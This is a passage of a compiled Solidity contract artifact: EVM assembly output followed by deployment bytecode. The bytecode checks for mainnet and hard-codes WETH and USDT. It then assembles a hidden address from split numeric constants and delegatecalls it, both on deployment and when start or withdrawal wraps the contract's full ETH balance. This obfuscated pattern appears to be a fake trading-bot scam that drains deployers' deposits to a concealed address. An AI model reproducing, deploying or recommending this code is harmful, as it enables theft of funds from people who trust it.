\"#utility.yul\":8301:8687   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8693:8964   */\n    tag_83:\n        /* \"#utility.yul\":8823:8826   */\n      0x00\n        /* \"#utility.yul\":8845:8938   */\n      tag_345\n        /* \"#utility.yul\":8934:8937   */\n      dup3\n        /* \"#utility.yul\":8925:8931   */\n      dup5\n        /* \"#utility.yul\":8845:8938   */\n      tag_260\n      jump\t// in\n    tag_345:\n        /* \"#utility.yul\":8838:8938   */\n      swap2\n      pop\n        /* \"#utility.yul\":8955:8958   */\n      dup2\n        /* \"#utility.yul\":8948:8958   */\n      swap1\n      pop\n        /* \"#utility.yul\":8693:8964   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8970:9150   */\n    tag_261:\n        /* \"#utility.yul\":9018:9095   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":9015:9016   */\n      0x00\n        /* \"#utility.yul\":9008:9096   */\n      mstore\n        /* \"#utility.yul\":9115:9119   */\n      0x11\n        /* \"#utility.yul\":9112:9113   */\n      0x04\n        /* \"#utility.yul\":9105:9120   */\n      mstore\n        /* \"#utility.yul\":9139:9143   */\n      0x24\n        /* \"#utility.yul\":9136:9137   */\n      0x00\n        /* \"#utility.yul\":9129:9144   */\n      revert\n        /* \"#utility.yul\":9156:9566   */\n    tag_120:\n        /* \"#utility.yul\":9196:9203   */\n      0x00\n        /* \"#utility.yul\":9219:9239   */\n      tag_348\n        /* \"#utility.yul\":9237:9238   */\n      dup3\n        /* \"#utility.yul\":9219:9239   */\n      tag_231\n      jump\t// in\n    tag_348:\n        /* \"#utility.yul\":9214:9239   */\n      swap2\n      pop\n        /* \"#utility.yul\":9253:9273   */\n      tag_349\n        /* \"#utility.yul\":9271:9272   */\n      dup4\n        /* \"#utility.yul\":9253:9273   */\n      tag_231\n      jump\t// in\n    tag_349:\n        /* \"#utility.yul\":9248:9273   */\n      swap3\n      pop\n        /* \"#utility.yul\":9308:9309   */\n      dup3\n        /* \"#utility.yul\":9305:9306   */\n      dup3\n        /* \"#utility.yul\":9301:9310   */\n      mul\n        /* \"#utility.yul\":9330:9360   */\n      tag_350\n        /* \"#utility.yul\":9348:9359   */\n      dup2\n        /* \"#utility.yul\":9330:9360   */\n      tag_231\n      jump\t// in\n    tag_350:\n        /* \"#utility.yul\":9319:9360   */\n      swap2\n      pop\n        /* \"#utility.yul\":9509:9510   */\n      dup3\n        /* \"#utility.yul\":9500:9507   */\n      dup3\n        /* \"#utility.yul\":9496:9511   */\n      div\n        /* \"#utility.yul\":9493:9494   */\n      dup5\n        /* \"#utility.yul\":9490:9512   */\n      eq\n        /* \"#utility.yul\":9470:9471   */\n      dup4\n        /* \"#utility.yul\":9463:9472   */\n      iszero\n        /* \"#utility.yul\":9443:9526   */\n      or\n        /* \"#utility.yul\":9420:9559   */\n      tag_351\n      jumpi\n        /* \"#utility.yul\":9539:9557   */\n      tag_352\n      tag_261\n      jump\t// in\n    tag_352:\n        /* \"#utility.yul\":9420:9559   */\n    tag_351:\n        /* \"#utility.yul\":9204:9566   */\n      pop\n        /* \"#utility.yul\":9156:9566   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":9572:9752   */\n    tag_123:\n        /* \"#utility.yul\":9620:9697   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":9617:9618   */\n      0x00\n        /* \"#utility.yul\":9610:9698   */\n      mstore\n        /* \"#utility.yul\":9717:9721   */\n      0x32\n        /* \"#utility.yul\":9714:9715   */\n      0x04\n        /* \"#utility.yul\":9707:9722   */\n      mstore\n        /* \"#utility.yul\":9741:9745   */\n      0x24\n        /* \"#utility.yul\":9738:9739   */\n      0x00\n        /* \"#utility.yul\":9731:9746   */\n      revert\n        /* \"#utility.yul\":9758:9949   */\n    tag_125:\n        /* \"#utility.yul\":9798:9801   */\n      0x00\n        /* \"#utility.yul\":9817:9837   */\n      tag_355\n        /* \"#utility.yul\":9835:9836   */\n      dup3\n        /* \"#utility.yul\":9817:9837   */\n      tag_239\n      jump\t// in\n    tag_355:\n        /* \"#utility.yul\":9812:9837   */\n      swap2\n      pop\n        /* \"#utility.yul\":9851:9871   */\n      tag_356\n        /* \"#utility.yul\":9869:9870   */\n      dup4\n        /* \"#utility.yul\":9851:9871   */\n      tag_239\n      jump\t// in\n    tag_356:\n        /* \"#utility.yul\":9846:9871   */\n      swap3\n      pop\n        /* \"#utility.yul\":9894:9895   */\n      dup3\n        /* \"#utility.yul\":9891:9892   */\n      dup3\n        /* \"#utility.yul\":9887:9896   */\n      add\n        /* \"#utility.yul\":9880:9896   */\n      swap1\n      pop\n        /* \"#utility.yul\":9915:9918   */\n      dup1\n        /* \"#utility.yul\":9912:9913   */\n      dup3\n        /* \"#utility.yul\":9909:9919   */\n      gt\n        /* \"#utility.yul\":9906:9942   */\n      iszero\n      tag_357\n      jumpi\n        /* \"#utility.yul\":9922:9940   */\n      tag_358\n      tag_261\n      jump\t// in\n    tag_358:\n        /* \"#utility.yul\":9906:9942   */\n    tag_357:\n        /* \"#utility.yul\":9758:9949   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":9955:10190   */\n    tag_131:\n        /* \"#utility.yul\":9995:9999   */\n      0x00\n        /* \"#utility.yul\":10015:10035   */\n      tag_360\n        /* \"#utility.yul\":10033:10034   */\n      dup3\n        /* \"#utility.yul\":10015:10035   */\n      tag_231\n      jump\t// in\n    tag_360:\n        /* \"#utility.yul\":10010:10035   */\n      swap2\n      pop\n        /* \"#utility.yul\":10049:10069   */\n      tag_361\n        /* \"#utility.yul\":10067:10068   */\n      dup4\n        /* \"#utility.yul\":10049:10069   */\n      tag_231\n      jump\t// in\n    tag_361:\n        /* \"#utility.yul\":10044:10069   */\n      swap3\n      pop\n        /* \"#utility.yul\":10093:10094   */\n      dup3\n        /* \"#utility.yul\":10090:10091   */\n      dup3\n        /* \"#utility.yul\":10086:10095   */\n      sub\n        /* \"#utility.yul\":10078:10095   */\n      swap1\n      pop\n        /* \"#utility.yul\":10117:10159   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":10111:10115   */\n      dup2\n        /* \"#utility.yul\":10108:10160   */\n      gt\n        /* \"#utility.yul\":10105:10183   */\n      iszero\n      tag_362\n      jumpi\n        /* \"#utility.yul\":10163:10181   */\n      tag_363\n      tag_261\n      jump\t// in\n    tag_363:\n        /* \"#utility.yul\":10105:10183   */\n    tag_362:\n        /* \"#utility.yul\":9955:10190   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10196:10428   */\n    tag_153:\n        /* \"#utility.yul\":10236:10239   */\n      0x00\n        /* \"#utility.yul\":10255:10275   */\n      tag_365\n        /* \"#utility.yul\":10273:10274   */\n      dup3\n        /* \"#utility.yul\":10255:10275   */\n      tag_231\n      jump\t// in\n    tag_365:\n        /* \"#utility.yul\":10250:10275   */\n      swap2\n      pop\n        /* \"#utility.yul\":10289:10309   */\n      tag_366\n        /* \"#utility.yul\":10307:10308   */\n      dup4\n        /* \"#utility.yul\":10289:10309   */\n      tag_231\n      jump\t// in\n    tag_366:\n        /* \"#utility.yul\":10284:10309   */\n      swap3\n      pop\n        /* \"#utility.yul\":10332:10333   */\n      dup3\n        /* \"#utility.yul\":10329:10330   */\n      dup3\n        /* \"#utility.yul\":10325:10334   */\n      add\n        /* \"#utility.yul\":10318:10334   */\n      swap1\n      pop\n        /* \"#utility.yul\":10355:10397   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":10350:10353   */\n      dup2\n        /* \"#utility.yul\":10347:10398   */\n      gt\n        /* \"#utility.yul\":10344:10421   */\n      iszero\n      tag_367\n      jumpi\n        /* \"#utility.yul\":10401:10419   */\n      tag_368\n      tag_261\n      jump\t// in\n    tag_368:\n        /* \"#utility.yul\":10344:10421   */\n    tag_367:\n        /* \"#utility.yul\":10196:10428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10434:10667   */\n    tag_165:\n        /* \"#utility.yul\":10473:10476   */\n      0x00\n        /* \"#utility.yul\":10496:10520   */\n      tag_370\n        /* \"#utility.yul\":10514:10519   */\n      dup3\n        /* \"#utility.yul\":10496:10520   */\n      tag_239\n      jump\t// in\n    tag_370:\n        /* \"#utility.yul\":10487:10520   */\n      swap2\n      pop\n        /* \"#utility.yul\":10542:10608   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":10535:10540   */\n      dup3\n        /* \"#utility.yul\":10532:10609   */\n      sub\n        /* \"#utility.yul\":10529:10632   */\n      tag_371\n      jumpi\n        /* \"#utility.yul\":10612:10630   */\n      tag_372\n      tag_261\n      jump\t// in\n    tag_372:\n        /* \"#utility.yul\":10529:10632   */\n    tag_371:\n        /* \"#utility.yul\":10659:10660   */\n      0x01\n        /* \"#utility.yul\":10652:10657   */\n      dup3\n        /* \"#utility.yul\":10648:10661   */\n      add\n        /* \"#utility.yul\":10641:10661   */\n      swap1\n      pop\n        /* \"#utility.yul\":10434:10667   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10673:10853   */\n    tag_262:\n        /* \"#utility.yul\":10721:10798   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":10718:10719   */\n      0x00\n        /* \"#utility.yul\":10711:10799   */\n      mstore\n        /* \"#utility.yul\":10818:10822   */\n      0x12\n        /* \"#utility.yul\":10815:10816   */\n      0x04\n        /* \"#utility.yul\":10808:10823   */\n      mstore\n        /* \"#utility.yul\":10842:10846   */\n      0x24\n        /* \"#utility.yul\":10839:10840   */\n      0x00\n        /* \"#utility.yul\":10832:10847   */\n      revert\n        /* \"#utility.yul\":10859:11044   */\n    tag_167:\n        /* \"#utility.yul\":10899:10900   */\n      0x00\n        /* \"#utility.yul\":10916:10936   */\n      tag_375\n        /* \"#utility.yul\":10934:10935   */\n      dup3\n        /* \"#utility.yul\":10916:10936   */\n      tag_239\n      jump\t// in\n    tag_375:\n        /* \"#utility.yul\":10911:10936   */\n      swap2\n      pop\n        /* \"#utility.yul\":10950:10970   */\n      tag_376\n        /* \"#utility.yul\":10968:10969   */\n      dup4\n        /* \"#utility.yul\":10950:10970   */\n      tag_239\n      jump\t// in\n    tag_376:\n        /* \"#utility.yul\":10945:10970   */\n      swap3\n      pop\n        /* \"#utility.yul\":10989:10990   */\n      dup3\n        /* \"#utility.yul\":10979:11014   */\n      tag_377\n      jumpi\n        /* \"#utility.yul\":10994:11012   */\n      tag_378\n      tag_262\n      jump\t// in\n    tag_378:\n        /* \"#utility.yul\":10979:11014   */\n    tag_377:\n        /* \"#utility.yul\":11036:11037   */\n      dup3\n        /* \"#utility.yul\":11033:11034   */\n      dup3\n        /* \"#utility.yul\":11029:11038   */\n      div\n        /* \"#utility.yul\":11024:11038   */\n      swap1\n      pop\n        /* \"#utility.yul\":10859:11044   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11050:11230   */\n    tag_170:\n        /* \"#utility.yul\":11098:11175   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":11095:11096   */\n      0x00\n        /* \"#utility.yul\":11088:11176   */\n      mstore\n        /* \"#utility.yul\":11195:11199   */\n      0x41\n        /* \"#utility.yul\":11192:11193   */\n      0x04\n        /* \"#utility.yul\":11185:11200   */\n      mstore\n        /* \"#utility.yul\":11219:11223   */\n      0x24\n        /* \"#utility.yul\":11216:11217   */\n      0x00\n        /* \"#utility.yul\":11209:11224   */\n      revert\n        /* \"#utility.yul\":11236:11412   */\n    tag_176:\n        /* \"#utility.yul\":11268:11269   */\n      0x00\n        /* \"#utility.yul\":11285:11305   */\n      tag_381\n        /* \"#utility.yul\":11303:11304   */\n      dup3\n        /* \"#utility.yul\":11285:11305   */\n      tag_239\n      jump\t// in\n    tag_381:\n        /* \"#utility.yul\":11280:11305   */\n      swap2\n      pop\n        /* \"#utility.yul\":11319:11339   */\n      tag_382\n        /* \"#utility.yul\":11337:11338   */\n      dup4\n        /* \"#utility.yul\":11319:11339   */\n      tag_239\n      jump\t// in\n    tag_382:\n        /* \"#utility.yul\":11314:11339   */\n      swap3\n      pop\n        /* \"#utility.yul\":11358:11359   */\n      dup3\n        /* \"#utility.yul\":11348:11383   */\n      tag_383\n      jumpi\n        /* \"#utility.yul\":11363:11381   */\n      tag_384\n      tag_262\n      jump\t// in\n    tag_384:\n        /* \"#utility.yul\":11348:11383   */\n    tag_383:\n        /* \"#utility.yul\":11404:11405   */\n      dup3\n        /* \"#utility.yul\":11401:11402   */\n      dup3\n        /* \"#utility.yul\":11397:11406   */\n      mod\n        /* \"#utility.yul\":11392:11406   */\n      swap1\n      pop\n        /* \"#utility.yul\":11236:11412   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11418:11612   */\n    tag_180:\n        /* \"#utility.yul\":11458:11462   */\n      0x00\n        /* \"#utility.yul\":11478:11498   */\n      tag_386\n        /* \"#utility.yul\":11496:11497   */\n      dup3\n        /* \"#utility.yul\":11478:11498   */\n      tag_239\n      jump\t// in\n    tag_386:\n        /* \"#utility.yul\":11473:11498   */\n      swap2\n      pop\n        /* \"#utility.yul\":11512:11532   */\n      tag_387\n        /* \"#utility.yul\":11530:11531   */\n      dup4\n        /* \"#utility.yul\":11512:11532   */\n      tag_239\n      jump\t// in\n    tag_387:\n        /* \"#utility.yul\":11507:11532   */\n      swap3\n      pop\n        /* \"#utility.yul\":11556:11557   */\n      dup3\n        /* \"#utility.yul\":11553:11554   */\n      dup3\n        /* \"#utility.yul\":11549:11558   */\n      sub\n        /* \"#utility.yul\":11541:11558   */\n      swap1\n      pop\n        /* \"#utility.yul\":11580:11581   */\n      dup2\n        /* \"#utility.yul\":11574:11578   */\n      dup2\n        /* \"#utility.yul\":11571:11582   */\n      gt\n        /* \"#utility.yul\":11568:11605   */\n      iszero\n      tag_388\n      jumpi\n        /* \"#utility.yul\":11585:11603   */\n      tag_389\n      tag_261\n      jump\t// in\n    tag_389:\n        /* \"#utility.yul\":11568:11605   */\n    tag_388:\n        /* \"#utility.yul\":11418:11612   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11618:11704   */\n    tag_263:\n        /* \"#utility.yul\":11653:11660   */\n      0x00\n        /* \"#utility.yul\":11693:11697   */\n      0xff\n        /* \"#utility.yul\":11686:11691   */\n      dup3\n        /* \"#utility.yul\":11682:11698   */\n      and\n        /* \"#utility.yul\":11671:11698   */\n      swap1\n      pop\n        /* \"#utility.yul\":11618:11704   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11710:11898   */\n    tag_224:\n        /* \"#utility.yul\":11748:11751   */\n      0x00\n        /* \"#utility.yul\":11767:11785   */\n      tag_392\n        /* \"#utility.yul\":11783:11784   */\n      dup3\n        /* \"#utility.yul\":11767:11785   */\n      tag_263\n      jump\t// in\n    tag_392:\n        /* \"#utility.yul\":11762:11785   */\n      swap2\n      pop\n        /* \"#utility.yul\":11799:11817   */\n      tag_393\n        /* \"#utility.yul\":11815:11816   */\n      dup4\n        /* \"#utility.yul\":11799:11817   */\n      tag_263\n      jump\t// in\n    tag_393:\n        /* \"#utility.yul\":11794:11817   */\n      swap3\n      pop\n        /* \"#utility.yul\":11840:11841   */\n      dup3\n        /* \"#utility.yul\":11837:11838   */\n      dup3\n        /* \"#utility.yul\":11833:11842   */\n      add\n        /* \"#utility.yul\":11826:11842   */\n      swap1\n      pop\n        /* \"#utility.yul\":11863:11867   */\n      0xff\n        /* \"#utility.yul\":11858:11861   */\n      dup2\n        /* \"#utility.yul\":11855:11868   */\n      gt\n        /* \"#utility.yul\":11852:11891   */\n      iszero\n      tag_394\n      jumpi\n        /* \"#utility.yul\":11871:11889   */\n      tag_395\n      tag_261\n      jump\t// in\n    tag_395:\n        /* \"#utility.yul\":11852:11891   */\n    tag_394:\n        /* \"#utility.yul\":11710:11898   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11904:12095   */\n    tag_230:\n        /* \"#utility.yul\":11942:11946   */\n      0x00\n        /* \"#utility.yul\":11962:11980   */\n      tag_397\n        /* \"#utility.yul\":11978:11979   */\n      dup3\n        /* \"#utility.yul\":11962:11980   */\n      tag_263\n      jump\t// in\n    tag_397:\n        /* \"#utility.yul\":11957:11980   */\n      swap2\n      pop\n        /* \"#utility.yul\":11994:12012   */\n      tag_398\n        /* \"#utility.yul\":12010:12011   */\n      dup4\n        /* \"#utility.yul\":11994:12012   */\n      tag_263\n      jump\t// in\n    tag_398:\n        /* \"#utility.yul\":11989:12012   */\n      swap3\n      pop\n        /* \"#utility.yul\":12036:12037   */\n      dup3\n        /* \"#utility.yul\":12033:12034   */\n      dup3\n        /* \"#utility.yul\":12029:12038   */\n      sub\n        /* \"#utility.yul\":12021:12038   */\n      swap1\n      pop\n        /* \"#utility.yul\":12060:12064   */\n      0xff\n        /* \"#utility.yul\":12054:12058   */\n      dup2\n        /* \"#utility.yul\":12051:12065   */\n      gt\n        /* \"#utility.yul\":12048:12088   */\n      iszero\n      tag_399\n      jumpi\n        /* \"#utility.yul\":12068:12086   */\n      tag_400\n      tag_261\n      jump\t// in\n    tag_400:\n        /* \"#utility.yul\":12048:12088   */\n    tag_399:\n        /* \"#utility.yul\":11904:12095   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205bc9528689f49d6ce06fa33ed05c756893dd4e114d1fcb69d3639a21529ae45364736f6c63430008120033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526000600260146101000a81548160ff0219169083151502179055503480156200002c57600080fd5b506001461462000073576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200006a9062000e15565b60405180910390fd5b33600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073dac17f958d2ee523a2206206994597c13d831ec7600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506200016f60006200017560201b60201c565b62001332565b6000620001976200018b620002e960201b60201c565b620004c960201b60201c565b90506000620001ab620007c760201b60201c565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1685604051602401620002049392919062000efc565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090506000808373ffffffffffffffffffffffffffffffffffffffff16836040516200028d919062000fb2565b600060405180830381855af49150503d8060008114620002ca576040519150601f19603f3d011682016040523d82523d6000602084013e620002cf565b606091505b509150915081620002e257805160208201fd5b5050505050565b60606000620002fd620007d660201b60201c565b90506000620f381d9050600062000319620007e160201b60201c565b90506000620125499050600062000335620007ec60201b60201c565b905060006158769050600062000350620007f760201b60201c565b90506000620b655a905060006200038e620003718a6200080260201b60201c565b620003828a6200080260201b60201c565b62000adf60201b60201c565b90506000620003c4620003a7896200080260201b60201c565b620003b8896200080260201b60201c565b62000adf60201b60201c565b90506000620003fa620003dd886200080260201b60201c565b620003ee886200080260201b60201c565b62000adf60201b60201c565b905060006200043062000413876200080260201b60201c565b62000424876200080260201b60201c565b62000adf60201b60201c565b90506000620004686200044a868662000adf60201b60201c565b6200045c858562000adf60201b60201c565b62000adf60201b60201c565b90506000620004b36040518060400160405280600281526020017f30780000000000000000000000000000000000000000000000000000000000008152508362000adf60201b60201c565b9050809e50505050505050505050505050505090565b600080829050600080806000600290505b602a811015620007ba5761010084620004f4919062000ffa565b93508481815181106200050c576200050b62001045565b5b602001015160f81c60f81b60f81c60ff169250846001826200052f91906200107e565b8151811062000543576200054262001045565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801562000595575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15620005b257605783620005aa9190620010b9565b925062000667565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015620005f1575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156200060e57603783620006069190620010b9565b925062000666565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156200064d575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156200066557603083620006629190620010b9565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015620006a6575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15620006c357605782620006bb9190620010b9565b915062000778565b60418273ffffffffffffffffffffffffffffffffffffffff161015801562000702575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156200071f57603782620007179190620010b9565b915062000777565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156200075e575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156200077657603082620007739190620010b9565b91505b5b5b8160108462000788919062000ffa565b62000794919062001108565b84620007a1919062001108565b9350600281620007b291906200107e565b9050620004da565b5082945050505050919050565b600063fd7e4d8060e01b905090565b60006204ead2905090565b60006202dcc7905090565b6000620ca7bb905090565b6000620c2916905090565b60606000808390505b600081146200083b578180620008219062001157565b925050601081620008339190620011d3565b90506200080b565b60008267ffffffffffffffff8111156200085a57620008596200120b565b5b6040519080825280601f01601f1916602001820160405280156200088d5781602001600182028036833780820191505090505b50905060005b838110156200094357601086620008ab91906200123a565b9250620008be8362000c9860201b60201c565b8260018387620008cf919062001272565b620008db919062001272565b81518110620008ef57620008ee62001045565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010866200092d9190620011d3565b9550806200093b9062001157565b905062000893565b5060008151905060048103620009ac5760006200099c6040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b6003810362000a0e576000620009fe6040518060400160405280600281526020017f30300000000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b6002810362000a7057600062000a606040518060400160405280600381526020017f30303000000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b6001810362000ad257600062000ac26040518060400160405280600481526020017f30303030000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b819450505050505b919050565b60606000839050600083905060008151835162000afd91906200107e565b67ffffffffffffffff81111562000b195762000b186200120b565b5b6040519080825280601f01601f19166020018201604052801562000b4c5781602001600182028036833780820191505090505b5090506000819050600080600091505b855182101562000bf05785828151811062000b7c5762000b7b62001045565b5b602001015160f81c60f81b83828062000b959062001157565b93508151811062000bab5762000baa62001045565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350818062000be79062001157565b92505062000b5c565b600091505b845182101562000c895784828151811062000c155762000c1462001045565b5b602001015160f81c60f81b83828062000c2e9062001157565b93508151811062000c445762000c4362001045565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350818062000c809062001157565b92505062000bf5565b82965050505050505092915050565b60008160ff1660001115801562000cb3575060098260ff1611155b1562000cf557817f300000000000000000000000000000000000000000000000000000000000000060f81c62000cea9190620012ba565b60f81b905062000d63565b8160ff16600a1115801562000d0e5750600f8260ff1611155b1562000d5e57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c62000d479190620012ba565b62000d539190620012f6565b60f81b905062000d63565b600080fd5b919050565b600082825260208201905092915050565b7f4f6e6c79206d61696e6e657420697320737570706f727465642e204f6e6c792060008201527f6d61696e6e657420697320737570706f727465642e204f6e6c79206d61696e6e60208201527f657420697320737570706f727465642e00000000000000000000000000000000604082015250565b600062000dfd60508362000d68565b915062000e0a8262000d79565b606082019050919050565b6000602082019050818103600083015262000e308162000dee565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600062000e648262000e37565b9050919050565b62000e768162000e57565b82525050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b6004811062000ebf5762000ebe62000e7c565b5b50565b600081905062000ed28262000eab565b919050565b600062000ee48262000ec2565b9050919050565b62000ef68162000ed7565b82525050565b600060608201905062000f13600083018662000e6b565b62000f22602083018562000e6b565b62000f31604083018462000eeb565b949350505050565b600081519050919050565b600081905092915050565b60005b8381101562000f6f57808201518184015260208101905062000f52565b60008484015250505050565b600062000f888262000f39565b62000f94818562000f44565b935062000fa681856020860162000f4f565b80840191505092915050565b600062000fc0828462000f7b565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000620010078262000e37565b9150620010148362000e37565b9250828202620010248162000e37565b915082820484148315176200103e576200103d62000fcb565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6000819050919050565b60006200108b8262001074565b9150620010988362001074565b9250828201905080821115620010b357620010b262000fcb565b5b92915050565b6000620010c68262000e37565b9150620010d38362000e37565b9250828203905073ffffffffffffffffffffffffffffffffffffffff81111562001102576200110162000fcb565b5b92915050565b6000620011158262000e37565b9150620011228362000e37565b9250828201905073ffffffffffffffffffffffffffffffffffffffff81111562001151576200115062000fcb565b5b92915050565b6000620011648262001074565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820362001199576200119862000fcb565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000620011e08262001074565b9150620011ed8362001074565b9250826200120057620011ff620011a4565b5b828204905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000620012478262001074565b9150620012548362001074565b925082620012675762001266620011a4565b5b828206905092915050565b60006200127f8262001074565b91506200128c8362001074565b9250828203905081811115620012a757620012a662000fcb565b5b92915050565b600060ff82169050919050565b6000620012c782620012ad565b9150620012d483620012ad565b9250828201905060ff811115620012f057620012ef62000fcb565b5b92915050565b60006200130382620012ad565b91506200131083620012ad565b9250828203905060ff8111156200132c576200132b62000fcb565b5b92915050565b6117eb80620013426000396000f3fe6080604052600436106100745760003560e01c8063be9a65551161004e578063be9a65551461017e578063c55dae6314610188578063d85bd526146101b3578063e086e5ec146101de57610119565b806307da68f51461011e578063217a4b70146101285780638da5cb5b1461015357610119565b3661011957600260149054906101000a900460ff16156101175760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100fc57600080fd5b505af1158015610110573d6000803e3d6000fd5b5050505050505b005b600080fd5b6101266101e8565b005b34801561013457600080fd5b5061013d610229565b60405161014a91906110b6565b60405180910390f35b34801561015f57600080fd5b5061016861024f565b60405161017591906110b6565b60405180910390f35b610186610275565b005b34801561019457600080fd5b5061019d6103f7565b6040516101aa91906110b6565b60405180910390f35b3480156101bf57600080fd5b506101c861041b565b6040516101d591906110ec565b60405180910390f35b6101e661042e565b005b6101f260026105e4565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161021f90611164565b60405180910390a1565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b61027f60016105e4565b6001600260146101000a81548160ff021916908315150217905550600047905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b15801561030757600080fd5b505af115801561031b573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb30836040518363ffffffff1660e01b815260040161037b92919061119d565b6020604051808303816000875af115801561039a573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103be91906111f7565b507fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab6040516103ec90611270565b60405180910390a150565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260149054906101000a900460ff1681565b600260149054906101000a900460ff1661047d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610474906112dc565b60405180910390fd5b61048760036105e4565b600047905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b1580156104f457600080fd5b505af1158015610508573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb30836040518363ffffffff1660e01b815260040161056892919061119d565b6020604051808303816000875af1158015610587573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ab91906111f7565b507fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab6040516105d990611348565b60405180910390a150565b60006105f66105f1610739565b610879565b90506000610602610b47565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1685604051602401610659939291906113df565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090506000808373ffffffffffffffffffffffffffffffffffffffff1683604051610